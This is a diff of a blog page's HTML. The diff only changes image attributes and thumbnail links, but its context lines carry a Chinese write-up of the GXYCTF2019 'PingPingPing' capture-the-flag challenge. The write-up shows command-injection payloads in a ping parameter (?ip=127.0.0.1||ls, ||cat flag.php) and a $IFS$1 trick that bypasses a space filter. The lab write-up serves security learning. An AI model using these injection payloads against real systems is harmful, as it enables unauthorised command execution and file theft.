@@ -246,17 +246,17 @@
 <a id="more"></a>
 
 <p>打开题目</p>
-<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p>
+<p><img data-action="zoom" src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p>
 <p>只有一个/?ip=</p>
 <p>尝试传?ip=127.0.0.1，得到回显</p>
-<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p>
+<p><img data-action="zoom" src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p>
 <p>利用管道符漏洞，传?ip=127.0.0.1||ls</p>
-<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p>
+<p><img data-action="zoom" src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p>
 <p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p>
-<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p>
+<p><img data-action="zoom" src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p>
 <p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p>
 <p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p>
-<p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p>
+<p><img data-action="zoom" src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p>
 <p>可以看到确实过滤了很多</p>
 <p>这里我用三种办法</p>
 <h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p>
@@ -294,7 +294,7 @@
               <div class="background">
 <!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">-->
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/6f005cbc1865ff1b706aba57347988ab.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/19313b0d62b27c8ba022f60fbfedd5ee.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Previous Post</span>
@@ -313,7 +313,7 @@
             <a href="/2020/06/13/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Http/" rel="next">
               <div class="background">
                 
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/b3e8dae89b950b940dc0edd1e8cc0566.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/xbclub/CDN@master/manifest/webp/1ac3fa3ef82c93a8d46384e256342711.webp" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
               </div>
               <span class="label">
               Next Post</span>
